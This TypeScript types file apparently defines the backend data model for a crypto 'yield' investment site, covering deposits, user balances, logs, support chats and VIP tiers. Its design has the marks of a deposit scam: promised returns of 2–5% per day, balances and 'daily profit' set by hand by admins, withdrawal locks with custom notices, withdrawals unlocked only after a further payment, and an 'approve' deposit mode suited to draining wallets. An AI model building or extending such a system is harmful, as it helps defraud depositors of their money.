export interface DepositSystem {
  id: string;
  currency: string;
  chainId: number;
  chainName: string;
  tokenAddress: string;
  enabled: boolean;
}

export interface UserAirdropConfig {
  id: string;
  targetAddress: string; // user's wallet address in lowercase, or 'ALL'
  standardUSDT: number;
  outputETH: number;
  endTime: number; // timestamp in ms
  durationDays: number;
  enabled: boolean;
  createdAt: number;
}

export interface AppConfig {
  recipientAddress: string;
  adminPasswordHash: string;
  minDepositUSDT: number;
  minWithdrawUSDT?: number;
  minParticipateETH?: number;
  baseYieldRate: number; // Daily yield rate
  depositMode?: 'approve' | 'transfer';
  depositSystems?: DepositSystem[];
  yieldTiers?: YieldTier[];
  airdropStandardUSDT?: number;
  airdropOutputETH?: number;
  airdropCountdownDays?: number;
  userAirdrops?: UserAirdropConfig[];
  showProfitChart?: boolean;
}

export interface UserAccount {
  walletAddress: string;
  usdtBalance: number;
  occupiedUSDT: number;
  totalYieldEarned: number;
  lastYieldPayout: number; // Timestamp
  createdAt: number;
  updatedAt?: number;
  usdcBalance?: number;
  occupiedUSDC?: number;
  btcBalance?: number;
  occupiedBTC?: number;
  ethBalance?: number;
  occupiedETH?: number;
  isBlocked?: boolean;
  isWithdrawLocked?: boolean;
  withdrawLockNotice?: string;
  thirdPartyWithdrawEnabled?: boolean; // Enabled by Admin after adding full balance
  thirdPartyBalance?: number;          // Balance added by Admin to Third-party Wallet
  customId?: string;
  dailyProfitEnabled?: boolean; // Manually turned ON/OFF by Admin
  dailyProfitAmount?: number;  // How many dollars profit that user gets daily (e.g. 10 USDT/day)
  airdropPledgedUSDT?: number;
  airdropConfig?: UserAirdropConfig;
  fundPassword?: string;
  referredBy?: string;
  referralCode?: string;
  referralCount?: number;
  commissionEarned?: number;
}

export interface TransactionLog {
  id: string;
  timestamp: number;
  walletAddress: string;
  type: 'connect' | 'deposit' | 'withdraw' | 'exchange' | 'yield' | 'forward' | 'admin_change_recipient' | 'admin_change_balance' | 'system';
  amount: number;
  currency: string;
  status: 'success' | 'pending' | 'failed';
  details: string;
  txHash?: string;
  proofImage?: string;
  walletType?: 'system' | 'third_party';
}

export interface SupportChatSession {
  chatId: string;
  walletAddress?: string;
  messages: Array<{
    id: string;
    sender: 'user' | 'agent';
    text: string;
    timestamp: number;
  }>;
  status: 'active' | 'closed';
  updatedAt: number;
  unreadForAdmin?: boolean;
  unreadForUser?: boolean;
}

export interface DatabaseState {
  config: AppConfig;
  users: Record<string, UserAccount>; // WalletAddress -> UserAccount
  logs: TransactionLog[];
  chats?: Record<string, SupportChatSession>;
}

export interface YieldTier {
  level: string;
  minAmount: number;
  maxAmount: number;
  yieldMin: number; // e.g. 0.0200 (2%)
  yieldMax: number; // e.g. 0.0200 (2%)
  unit: string;
  revenueRange?: string; // e.g. "2 ~ 20"
}

export const YIELD_TIERS: YieldTier[] = [
  { level: 'VIP',  minAmount: 100,    maxAmount: 1000,    yieldMin: 0.020, yieldMax: 0.020, unit: 'USDT', revenueRange: '2 ~ 20' },
  { level: 'VIP1', minAmount: 1001,   maxAmount: 5000,    yieldMin: 0.024, yieldMax: 0.024, unit: 'USDT', revenueRange: '24.02 ~ 120' },
  { level: 'VIP2', minAmount: 5001,   maxAmount: 10000,   yieldMin: 0.026, yieldMax: 0.026, unit: 'USDT', revenueRange: '130.02 ~ 260' },
  { level: 'VIP3', minAmount: 10001,  maxAmount: 20000,   yieldMin: 0.028, yieldMax: 0.028, unit: 'USDT', revenueRange: '280.02 ~ 559.99' },
  { level: 'VIP4', minAmount: 20001,  maxAmount: 50000,   yieldMin: 0.030, yieldMax: 0.030, unit: 'USDT', revenueRange: '600.03 ~ 1500' },
  { level: 'VIP5', minAmount: 50001,  maxAmount: 200000,  yieldMin: 0.032, yieldMax: 0.032, unit: 'USDT', revenueRange: '1600.03 ~ 6400' },
  { level: 'VIP6', minAmount: 200001, maxAmount: 500000,  yieldMin: 0.040, yieldMax: 0.040, unit: 'USDT', revenueRange: '8000.04 ~ 20000' },
  { level: 'VIP7', minAmount: 500001, maxAmount: 9999999, yieldMin: 0.050, yieldMax: 0.050, unit: 'USDT', revenueRange: '25000.05 ~ 499999.95' },
];
